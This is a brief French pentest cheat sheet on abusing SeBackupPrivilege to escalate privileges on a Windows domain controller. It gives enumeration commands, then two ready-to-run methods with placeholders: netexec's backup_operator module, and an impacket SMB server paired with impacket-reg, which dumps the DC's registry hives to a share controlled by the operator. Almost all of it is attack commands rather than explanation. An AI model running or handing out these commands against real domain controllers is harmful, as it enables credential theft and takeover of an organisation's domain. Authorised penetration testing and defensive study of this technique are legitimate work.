
Ref: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/



Identifier le user et ses droits
```bash 
# Enumeration 
whoami
whoami /groups
whoami /priv

net user <USER>
```

Les 2 droits à identifier : 
  SeBackupPrivilige permet de lire les fichiers sans considèrer les ACL
  SeRestorePrivilege permet d'ecrire des fichiers.

## Methode 1: afficher avec netexec sur le module backup_operator
``` bash 
nxc smb <IP-DC> -u <USER> -p <PASS> -M backup_operator
```

Methode 2: impact-reg + SMB server 
```
impacket-smbserver share $(pwd) -smb2support
```

```
impacket-reg "<DOMAIN_NAME>"/"<USER>":"<PASS>"@"<IP-DC>" backup -o '\\<IP-share>\share'
```

